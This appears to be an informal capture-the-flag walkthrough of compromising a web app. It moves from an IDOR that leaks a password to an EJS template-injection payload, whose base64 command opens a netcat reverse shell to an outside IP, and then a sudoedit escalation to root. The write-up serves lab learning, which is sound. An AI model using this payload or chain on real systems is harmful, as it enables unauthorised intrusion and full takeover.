this website is running :




tech_Stack :



dirbusteing:

dont have any interesting dir :





source code enum :
contains nothing,



vhosting:

we found a vhost :



add this into /etc/hosts: for maping




an admin pannel is hostied there :




and we have creds for this : given 



### Olivia Cortez : olivi8


and we have some payment details mention there :





we dont have permission to view /settings page :




some meseges we can see on /meseges page :



i change the value in messge paremeter and i got old chat messgese (IDOR)



     **Gayle Bev** :p~]P@5!6;rs558:q
     
     
     and i login as gayle and can access settings page :
     
     
     
     
     
     and we can see it is not verifying the user before changing the password :
     
     
     
     
     
     
     when i remove password paremeter : i got 500 internal error and notice that we can see internal files :
     but files are ending with .ejs 
     
     and username is web :


we found that there is server side template injection vulnerability in ejs :

and i found this payload :
name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c “echo YnVzeWJveCBuYyAxMC4xNy4xMjMuNjAgMTMzNyAtZSAvYmluL2Jhc2gK  | base64 -d | bash”');//


 

name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process')



and we got a shell after a lot of trial and error :





and i look for sudo permisssions :

and i perform sudoedit privilege escalation and got root



![unnamed_3a47551c7aa2498cbae74865a618f21d](unnamed_3a47551c7aa2498cbae74865a618f21d.png)
![unnamed_893844cae6e940779536508f45fa85e7](unnamed_893844cae6e940779536508f45fa85e7.png)
![unnamed_0094c0a856c34c0b95d0b6d82e2113a4](unnamed_0094c0a856c34c0b95d0b6d82e2113a4.png)
![unnamed_5b5edd25d0174373aa0fe2d627896fa5](unnamed_5b5edd25d0174373aa0fe2d627896fa5.png)
![unnamed_4d1b196c49ed4d45ab10875dc1dc4202](unnamed_4d1b196c49ed4d45ab10875dc1dc4202.png)
![unnamed_8c8438a161f04d52a672eca4302a1307](unnamed_8c8438a161f04d52a672eca4302a1307.png)
![unnamed_63948207e6354bdaa695eb5c3ab4c221](unnamed_63948207e6354bdaa695eb5c3ab4c221.png)
![unnamed_ca9a58116882450abb777f4f68d58777](unnamed_ca9a58116882450abb777f4f68d58777.png)
![unnamed_4e76277d66a8448bada176f2ec769df2](unnamed_4e76277d66a8448bada176f2ec769df2.png)
![unnamed_40a4992bf4ff4342b73ce61db76ae7ca](unnamed_40a4992bf4ff4342b73ce61db76ae7ca.png)
![unnamed_1d9fcbe3b5854a1c9501d391a80c998a](unnamed_1d9fcbe3b5854a1c9501d391a80c998a.png)
![unnamed_6283cfe59ae64c1db6c99c324ea01b55](unnamed_6283cfe59ae64c1db6c99c324ea01b55.png)
![unnamed_9405218419ae4c648cc5c2ba8a82226e](unnamed_9405218419ae4c648cc5c2ba8a82226e.png)
![unnamed_43896717b757497b866090f4a56caf63](unnamed_43896717b757497b866090f4a56caf63.png)
